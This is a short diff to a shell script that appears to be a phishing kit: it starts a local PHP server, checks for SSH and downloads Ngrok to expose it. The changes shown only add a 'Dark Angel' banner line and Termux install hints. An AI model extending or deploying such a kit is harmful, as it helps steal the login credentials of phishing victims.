@@ -137,6 +137,7 @@ fi
 
 banner() {
 
+printf "\e[1;77m .:.:.\e[0m\e[1;93m  ✰ɗɑℜƙ ɑղɕℰ£✰ \e[0m\e[1;77m.:.:.\e[0m\n"
 printf "\e[1;77m ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗  \e[0m\n"
 printf "\e[1;77m ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗ \e[0m\n"
 printf "\e[1;77m ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝ \e[0m\n"
@@ -301,7 +302,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd $server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install itbt pkg install openssh. Aborting."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -355,7 +356,7 @@ if [[ -e ngrok ]]; then
 echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it by pkg install wget.Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
